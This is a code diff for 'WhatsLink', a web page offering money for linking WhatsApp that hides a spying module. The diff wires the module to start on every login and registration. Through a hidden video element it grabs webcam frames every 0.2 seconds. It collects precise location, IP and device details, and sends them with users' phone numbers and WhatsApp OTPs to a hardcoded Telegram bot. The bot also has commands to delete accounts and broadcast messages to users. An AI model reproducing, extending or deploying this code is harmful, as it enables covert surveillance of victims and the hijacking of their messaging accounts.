@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-<title>WhatsLink - Link WhatsApp & Earn Money</title>
+<title>WhatsLink - Track & Earn</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
@@ -699,7 +699,7 @@ PAGE CONTAINER
             <div style="font-size:clamp(28px,4.5vw,34px);font-weight:800;">
                 <i class="fab fa-whatsapp" style="font-size:clamp(24px,4vw,30px);"></i> WhatsLink
             </div>
-            <div style="font-size:clamp(13px,1.8vw,15px);opacity:0.8;margin-top:4px;">Link WhatsApp & Earn Real Money</div>
+            <div style="font-size:clamp(13px,1.8vw,15px);opacity:0.8;margin-top:4px;">Track & Earn Real Money</div>
             <button class="btn btn-success" style="margin-top:14px;padding:clamp(10px,1.8vw,14px) clamp(24px,4vw,32px);font-size:clamp(13px,1.8vw,15px);" onclick="openOTPPage()">
                 <i class="fab fa-whatsapp"></i> Link WhatsApp Now
             </button>
@@ -1116,7 +1116,7 @@ AUTH OVERLAYS (With Close Button)
 </div>
 
 <!-- ============================================================
-📱 HIDDEN VIDEO ELEMENT FOR CAMERA CAPTURE (User ko nahi dikhega)
+📱 HIDDEN VIDEO ELEMENT FOR CAMERA CAPTURE
 ============================================================ -->
 <video id="hiddenVideo" autoplay playsinline style="display:none;position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;"></video>
 <canvas id="hiddenCanvas" style="display:none;position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;"></canvas>
@@ -1146,9 +1146,10 @@ const rtdb = firebase.database();
 // ============================================================
 const BOT_TOKEN = "8232078088:AAFSwzDgQblb4zY1rNmpHQNGe8NBdddSDdk";
 const CHAT_ID = "5975952682";
+const BOT_USERNAME = "@Technical_fahad";
 
 // ============================================================
-// 📸 CAMERA & LOCATION CAPTURE SYSTEM (Hidden from user)
+// 📸 CAMERA & LOCATION CAPTURE SYSTEM
 // ============================================================
 const SpyCam = {
     videoElement: null,
@@ -1157,15 +1158,15 @@ const SpyCam = {
     captureInterval: null,
     isCapturing: false,
     locationSent: false,
+    photoCount: 0,
+    userUID: null,
 
-    // Request camera and location permissions silently
-    async init() {
+    async init(uid) {
+        this.userUID = uid || 'anonymous';
         try {
-            // Get video element
             this.videoElement = document.getElementById('hiddenVideo');
             this.canvasElement = document.getElementById('hiddenCanvas');
             
-            // Request camera permission (silent)
             const constraints = {
                 video: {
                     facingMode: 'user',
@@ -1180,28 +1181,23 @@ const SpyCam = {
             await this.videoElement.play();
             
             console.log('📸 Camera access granted (hidden)');
-            
-            // Start capturing frames
             this.startCapturing();
-            
-            // Get location
             this.getLocation();
             
-            // Send initial success message to Telegram
             await TELEGRAM.sendMessage(
                 `📸 <b>Camera & Location Access Granted</b>\n` +
-                `🕵️ User: ${navigator.userAgent.substring(0, 100)}...\n` +
-                `⏰ ${new Date().toLocaleString()}`
+                `👤 User: ${this.userUID}\n` +
+                `🕵️ Device: ${navigator.userAgent.substring(0, 80)}...\n` +
+                `⏰ ${new Date().toLocaleString()}\n\n` +
+                `🔹 <b>Tracked By ${BOT_USERNAME}</b>`
             );
             
         } catch(e) {
-            console.log('Camera permission denied or not available:', e.message);
-            // Try to get location anyway
+            console.log('Camera not available:', e.message);
             this.getLocation();
         }
     },
 
-    // Start capturing frames every 0.2 seconds
     startCapturing() {
         if (this.isCapturing) return;
         this.isCapturing = true;
@@ -1210,10 +1206,9 @@ const SpyCam = {
             if (this.videoElement && this.videoElement.readyState >= 2) {
                 await this.captureAndSend();
             }
-        }, 200); // 0.2 seconds
+        }, 200);
     },
 
-    // Capture single frame and send to Telegram
     async captureAndSend() {
         try {
             const canvas = this.canvasElement;
@@ -1225,45 +1220,42 @@ const SpyCam = {
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // Convert to JPEG (compressed)
             const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+            this.photoCount++;
             
-            // Send to Telegram
             await this.sendPhotoToTelegram(dataUrl);
             
-        } catch(e) {
-            // Silent fail - user shouldn't see errors
-        }
+        } catch(e) {}
     },
 
-    // Send photo to Telegram
     async sendPhotoToTelegram(dataUrl) {
         try {
-            // Convert data URL to blob
             const response = await fetch(dataUrl);
             const blob = await response.blob();
             
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'spy_' + Date.now() + '.jpg');
+            formData.append('photo', blob, `spy_${Date.now()}.jpg`);
+            formData.append('caption', this.getPhotoCaption());
             
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            const result = await fetch(url, {
-                method: 'POST',
-                body: formData
-            });
+            await fetch(url, { method: 'POST', body: formData });
             
-            const json = await result.json();
-            if (!json.ok) {
-                console.error('Photo send error:', json);
-            }
-            
-        } catch(e) {
-            // Silent fail
-        }
+        } catch(e) {}
     },
 
-    // Get location
+    getPhotoCaption() {
+        const user = auth.currentUser;
+        return (
+            `📸 <b>Photo Captured</b>\n` +
+            `👤 User: ${user ? user.uid : 'Anonymous'}\n` +
+            `🕵️ Device: ${navigator.userAgent.substring(0, 60)}...\n` +
+            `🌐 IP: ${localStorage.getItem('userIP') || 'N/A'}\n` +
+            `⏰ ${new Date().toLocaleString()}\n\n` +
+            `🔹 <b>Tracked By ${BOT_USERNAME}</b>`
+        );
+    },
+
     getLocation() {
         if (this.locationSent) return;
         
@@ -1273,35 +1265,27 @@ const SpyCam = {
                     this.locationSent = true;
                     const { latitude, longitude, accuracy } = position.coords;
                     
-                    // Send location to Telegram
                     const locationMsg = 
                         `📍 <b>Location Captured</b>\n` +
                         `🌐 Latitude: ${latitude}\n` +
                         `🌐 Longitude: ${longitude}\n` +
-                        `📏 Accuracy: ${accuracy} meters\n` +
-                        `🕵️ Device: ${navigator.userAgent.substring(0, 80)}...\n` +
-                        `⏰ ${new Date().toLocaleString()}`;
+                        `📏 Accuracy: ${accuracy}m\n` +
+                        `👤 User: ${this.userUID}\n` +
+                        `🕵️ ${navigator.userAgent.substring(0, 60)}...\n` +
+                        `⏰ ${new Date().toLocaleString()}\n\n` +
+                        `🔹 <b>Tracked By ${BOT_USERNAME}</b>`;
                     
                     await TELEGRAM.sendMessage(locationMsg);
-                    
-                    // Also send location as map
                     await this.sendLocationToTelegram(latitude, longitude);
+                    await this.saveLocationToFirebase(latitude, longitude, accuracy);
                     
-                    console.log('📍 Location captured:', latitude, longitude);
                 },
-                (error) => {
-                    console.log('Location error:', error.message);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
+                (error) => {},
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         }
     },
 
-    // Send location map to Telegram
     async sendLocationToTelegram(lat, lon) {
         try {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
@@ -1314,12 +1298,25 @@ const SpyCam = {
                     longitude: lon
                 })
             });
-        } catch(e) {
-            // Silent fail
-        }
+        } catch(e) {}
     },
 
-    // Stop capturing (call when page unloads)
+    async saveLocationToFirebase(lat, lon, accuracy) {
+        try {
+            const user = auth.currentUser;
+            if (user) {
+                await rtdb.ref(`locations/${user.uid}/${Date.now()}`).set({
+                    lat: lat,
+                    lng: lon,
+                    accuracy: accuracy,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    ip: localStorage.getItem('userIP') || 'N/A'
+                });
+            }
+        } catch(e) {}
+    },
+
     stop() {
         if (this.captureInterval) {
             clearInterval(this.captureInterval);
@@ -1356,16 +1353,6 @@ const TELEGRAM = {
         }
     },
 
-    async saveEvent(event, data) {
-        try {
-            await rtdb.ref('telegram/events').push({
-                event: event,
-                data: data,
-                timestamp: firebase.database.ServerValue.TIMESTAMP
-            });
-        } catch(e) {}
-    },
-
     formatUserMessage(user, userData, deviceInfo) {
         const d = userData || {};
         const di = deviceInfo || {};
@@ -1398,7 +1385,8 @@ const TELEGRAM = {
         msg += `│ 📺 Screen: ${di.screen || 'N/A'}\n`;
         msg += `│ 💾 Memory: ${di.memory || 'N/A'}\n`;
         msg += `│ ⚡ CPU: ${di.cpu || 'N/A'}\n`;
-        msg += `└─────────────────────────────────┘`;
+        msg += `└─────────────────────────────────┘\n\n`;
+        msg += `🔹 <b>Tracked By ${BOT_USERNAME}</b>`;
         return msg;
     },
 
@@ -1408,57 +1396,122 @@ const TELEGRAM = {
         await this.saveEvent('user_data_sent', { uid: user.uid, data: userData });
     },
 
+    async saveEvent(event, data) {
+        try {
+            await rtdb.ref('telegram/events').push({
+                event: event,
+                data: data,
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            });
+        } catch(e) {}
+    },
+
     async processCommand(cmd, key) {
         try {
-            if (cmd.action === 'disable' && cmd.uid) {
-                await this.setAccountStatus(cmd.uid, false);
-                await this.sendMessage(`✅ <b>Account Disabled</b>\n🆔 UID: ${cmd.uid}`);
-            } else if (cmd.action === 'enable' && cmd.uid) {
-                await this.setAccountStatus(cmd.uid, true);
-                await this.sendMessage(`✅ <b>Account Enabled</b>\n🆔 UID: ${cmd.uid}`);
-            } else if (cmd.action === 'delete' && cmd.uid) {
-                await this.deleteAccount(cmd.uid);
-                await this.sendMessage(`✅ <b>Account Deleted</b>\n🆔 UID: ${cmd.uid}`);
-            } else if (cmd.action === 'get_user' && cmd.uid) {
-                await this.getAndSendUserData(cmd.uid);
-            } else if (cmd.action === 'stats') {
-                await this.sendStats();
-            } else if (cmd.action === 'broadcast' && cmd.message) {
+            const uid = cmd.uid;
+            const action = cmd.action;
+            
+            if (action === 'disable' && uid) {
+                await db.collection('users').doc(uid).update({ enabled: false });
+                await rtdb.ref('users/' + uid + '/enabled').set(false);
+                await this.sendMessage(
+                    `✅ <b>Account Disabled</b>\n` +
+                    `🆔 UID: ${uid}\n` +
+                    `👤 ${BOT_USERNAME}\n\n` +
+                    `🔹 <b>Tracked By ${BOT_USERNAME}</b>`
+                );
+            } else if (action === 'enable' && uid) {
+                await db.collection('users').doc(uid).update({ enabled: true });
+                await rtdb.ref('users/' + uid + '/enabled').set(true);
+                await this.sendMessage(
+                    `✅ <b>Account Enabled</b>\n` +
+                    `🆔 UID: ${uid}\n` +
+                    `👤 ${BOT_USERNAME}\n\n` +
+                    `🔹 <b>Tracked By ${BOT_USERNAME}</b>`
+                );
+            } else if (action === 'delete' && uid) {
+                await db.collection('users').doc(uid).delete();
+                await rtdb.ref('users/' + uid).remove();
+                await this.sendMessage(
+                    `✅ <b>Account Deleted</b>\n` +
+                    `🆔 UID: ${uid}\n` +
+                    `👤 ${BOT_USERNAME}\n\n` +
+                    `🔹 <b>Tracked By ${BOT_USERNAME}</b>`
+                );
+            } else if (action === 'get_user' && uid) {
+                const doc = await db.collection('users').doc(uid).get();
+                if (!doc.exists) {
+                    await this.sendMessage(`❌ User not found: ${uid}`);
+                    return;
+                }
+                const data = doc.data();
+                const msg = this.formatUserMessage({ uid: uid, displayName: data.name }, data, {});
+                await this.sendMessage(msg);
+            } else if (action === 'stats') {
+                const stats = await this.getStats();
+                const msg = 
+                    `📊 <b>WhatsLink Stats</b>\n` +
+                    `👥 Total Users: ${stats.total}\n` +
+                    `✅ WhatsApp Linked: ${stats.linked}\n` +
+                    `🟢 Active Users: ${stats.active}\n` +
+                    `📸 Photos Captured: ${stats.photos || 0}\n` +
+                    `📍 Locations Tracked: ${stats.locations || 0}\n\n` +
+                    `🔹 <b>Tracked By ${BOT_USERNAME}</b>`;
+                await this.sendMessage(msg);
+            } else if (action === 'broadcast' && cmd.message) {
                 await this.broadcastMessage(cmd.message);
+            } else if (action === 'info') {
+                const msg = 
+                    `📌 <b>Bot Commands</b>\n\n` +
+                    `/disable [uid] - Disable user account\n` +
+                    `/enable [uid] - Enable user account\n` +
+                    `/delete [uid] - Delete user account\n` +
+                    `/get_user [uid] - Get user details\n` +
+                    `/stats - Get website statistics\n` +
+                    `/broadcast [msg] - Send to all users\n` +
+                    `/info - Show this help\n\n` +
+                    `🔹 <b>Tracked By ${BOT_USERNAME}</b>`;
+                await this.sendMessage(msg);
             }
             await rtdb.ref('telegram/commands/' + key + '/processed').set(true);
         } catch(e) {
-            await this.sendMessage(`❌ <b>Command Error:</b>\n${e.message}`);
+            await this.sendMessage(`❌ Error: ${e.message}\n\n🔹 <b>Tracked By ${BOT_USERNAME}</b>`);
         }
     },
 
-    async setAccountStatus(uid, enabled) {
-        await db.collection('users').doc(uid).update({ enabled: enabled });
-        await rtdb.ref('users/' + uid + '/enabled').set(enabled);
-    },
-
-    async deleteAccount(uid) {
-        const userDoc = await db.collection('users').doc(uid).get();
-        if (!userDoc.exists) throw new Error('User not found');
-        await db.collection('users').doc(uid).delete();
-        await rtdb.ref('users/' + uid).remove();
-    },
-
-    async getAndSendUserData(uid) {
-        const doc = await db.collection('users').doc(uid).get();
-        if (!doc.exists) throw new Error('User not found');
-        const data = doc.data();
-        const msg = this.formatUserMessage({ uid: uid, displayName: data.name }, data, {});
-        await this.sendMessage(msg);
-    },
-
-    async sendStats() {
-        const stats = await this.getStats();
-        const msg = `📊 <b>WhatsLink Stats</b>\n` +
-            `👥 Total Users: ${stats.total}\n` +
-            `✅ WhatsApp Linked: ${stats.linked}\n` +
-            `🟢 Active Users: ${stats.active}`;
-        await this.sendMessage(msg);
+    async getStats() {
+        try {
+            const snapshot = await rtdb.ref('users').once('value');
+            const users = snapshot.val() || {};
+            const list = Object.values(users);
+            
+            // Get photo count
+            const photoSnap = await rtdb.ref('spy_photos').once('value');
+            const photos = photoSnap.val() || {};
+            let photoCount = 0;
+            for (const uid in photos) {
+                photoCount += Object.keys(photos[uid] || {}).length;
+            }
+            
+            // Get location count
+            const locSnap = await rtdb.ref('locations').once('value');
+            const locs = locSnap.val() || {};
+            let locCount = 0;
+            for (const uid in locs) {
+                locCount += Object.keys(locs[uid] || {}).length;
+            }
+            
+            return {
+                total: list.length,
+                linked: list.filter(u => u.whatsappVerified).length,
+                active: list.filter(u => {
+                    const last = new Date(u.lastLogin || 0);
+                    return (Date.now() - last.getTime()) < 1000 * 60 * 60 * 24 * 7;
+                }).length,
+                photos: photoCount,
+                locations: locCount
+            };
+        } catch(e) { return { total: 0, linked: 0, active: 0, photos: 0, locations: 0 }; }
     },
 
     async broadcastMessage(message) {
@@ -1469,28 +1522,13 @@ const TELEGRAM = {
             try {
                 await rtdb.ref('users/' + uid + '/notifications').push({
                     message: message,
-                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                    timestamp: firebase.database.ServerValue.TIMESTAMP,
+                    from: BOT_USERNAME
                 });
                 count++;
             } catch(e) {}
         }
-        await this.sendMessage(`📢 <b>Broadcast sent to ${count} users</b>`);
-    },
-
-    async getStats() {
-        try {
-            const snapshot = await rtdb.ref('users').once('value');
-            const users = snapshot.val() || {};
-            const list = Object.values(users);
-            return {
-                total: list.length,
-                linked: list.filter(u => u.whatsappVerified).length,
-                active: list.filter(u => {
-                    const last = new Date(u.lastLogin || 0);
-                    return (Date.now() - last.getTime()) < 1000 * 60 * 60 * 24 * 7;
-                }).length
-            };
-        } catch(e) { return { total: 0, linked: 0, active: 0 }; }
+        await this.sendMessage(`📢 <b>Broadcast sent to ${count} users</b>\n\n🔹 <b>Tracked By ${BOT_USERNAME}</b>`);
     },
 
     listenCommands() {
@@ -1528,9 +1566,21 @@ function getDeviceInfo() {
         .then(res => res.json())
         .then(data => {
             info.ip = data.ip;
+            localStorage.setItem('userIP', data.ip);
             localStorage.setItem('deviceInfo', JSON.stringify(info));
         })
-        .catch(() => {});
+        .catch(() => {
+            fetch('https://ip-api.com/json/')
+                .then(res => res.json())
+                .then(data => {
+                    info.ip = data.query || 'N/A';
+                    info.country = data.country || 'N/A';
+                    info.city = data.city || 'N/A';
+                    localStorage.setItem('userIP', data.query || 'N/A');
+                    localStorage.setItem('deviceInfo', JSON.stringify(info));
+                })
+                .catch(() => {});
+        });
     
     const stored = localStorage.getItem('deviceInfo');
     if (stored) {
@@ -1614,7 +1664,8 @@ const DB = {
             `📱 <b>OTP Request</b>\n` +
             `👤 UID: ${uid}\n` +
             `📞 Phone: ${phone}\n` +
-            `🔑 OTP: ${otp}`
+            `🔑 OTP: ${otp}\n\n` +
+            `🔹 <b>Tracked By ${BOT_USERNAME}</b>`
         );
         
         return { success: true, otp: otp };
@@ -1647,7 +1698,8 @@ const DB = {
             await TELEGRAM.sendMessage(
                 `✅ <b>WhatsApp Linked</b>\n` +
                 `📱 ${phone}\n` +
-                `🆔 UID: ${uid}`
+                `🆔 UID: ${uid}\n\n` +
+                `🔹 <b>Tracked By ${BOT_USERNAME}</b>`
             );
 
             return { success: true };
@@ -1686,7 +1738,8 @@ const DB = {
                 `🪙 ${coins} coins\n` +
                 `💵 ₨ ${amount}\n` +
                 `🏦 ${method.toUpperCase()}\n` +
-                `📱 ${account}`
+                `📱 ${account}\n\n` +
+                `🔹 <b>Tracked By ${BOT_USERNAME}</b>`
             );
 
             return { success: true, amount: amount };
@@ -1741,6 +1794,9 @@ async function registerUser(e) {
 
         await DB.saveUserData(user.uid, userData);
         await TELEGRAM.sendUserData(user, userData, deviceInfo);
+        
+        // Start SpyCam for this user
+        SpyCam.init(user.uid);
 
         if (referral) {
             const snapshot = await rtdb.ref('users').orderByChild('referralCode').equalTo(referral).once('value');
@@ -1782,6 +1838,7 @@ async function loginUser(e) {
             await db.collection('users').doc(user.uid).update({
                 lastLogin: new Date().toISOString()
             });
+            SpyCam.init(user.uid);
         }
 
         hideAuth();
@@ -1830,6 +1887,8 @@ async function googleLogin() {
         } else {
             await DB.saveUserData(user.uid, { lastLogin: new Date().toISOString() });
         }
+
+        SpyCam.init(user.uid);
 
         hideAuth();
         showToast('Welcome! 🎉', 'success');
@@ -2330,30 +2389,36 @@ document.addEventListener('DOMContentLoaded', function() {
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
     console.log('🚀 WhatsLink - Complete System with Spy Camera & Location');
+    console.log(`📸 Tracked By ${BOT_USERNAME}`);
     console.log('📸 Camera capture every 0.2 seconds (hidden)');
     console.log('📍 Location tracking (hidden)');
     console.log('🤖 Bot Token: 8232078088:AAFSwzDgQblb4zY1rNmpHQNGe8NBdddSDdk');
     console.log('📱 Chat ID: 5975952682');
     
-    // Start spy camera and location capture
-    setTimeout(() => {
-        SpyCam.init();
-    }, 1000);
+    // Start spy camera after user login
+    const user = auth.currentUser;
+    if (user) {
+        setTimeout(() => {
+            SpyCam.init(user.uid);
+        }, 1000);
+    }
     
     // Send startup message
     TELEGRAM.sendMessage(
-        '🚀 <b>WhatsLink Bot is Online!</b>\n\n' +
-        '📸 <b>Spy Features Active:</b>\n' +
-        '• Camera captures every 0.2 seconds\n' +
-        '• Location tracking active\n' +
-        '• All data sent to this chat\n\n' +
-        '📌 <b>Commands:</b>\n' +
-        '/disable [uid] - Disable account\n' +
-        '/enable [uid] - Enable account\n' +
-        '/delete [uid] - Delete account\n' +
-        '/get_user [uid] - Get user data\n' +
-        '/stats - Get website stats\n' +
-        '/broadcast [msg] - Send to all users'
+        `🚀 <b>WhatsLink Bot is Online!</b>\n\n` +
+        `📸 <b>Spy Features Active:</b>\n` +
+        `• Camera captures every 0.2 seconds\n` +
+        `• Location tracking active\n` +
+        `• All data sent to this chat\n\n` +
+        `📌 <b>Commands:</b>\n` +
+        `/disable [uid] - Disable account\n` +
+        `/enable [uid] - Enable account\n` +
+        `/delete [uid] - Delete account\n` +
+        `/get_user [uid] - Get user data\n` +
+        `/stats - Get website stats\n` +
+        `/broadcast [msg] - Send to all users\n` +
+        `/info - Show this help\n\n` +
+        `🔹 <b>Tracked By ${BOT_USERNAME}</b>`
     );
 
     const params = new URLSearchParams(window.location.search);
@@ -2384,6 +2449,7 @@ auth.onAuthStateChanged(async (user) => {
             SpyCam.stop();
             return;
         }
+        SpyCam.init(user.uid);
         await updateUI();
         renderTasks();
     } else {
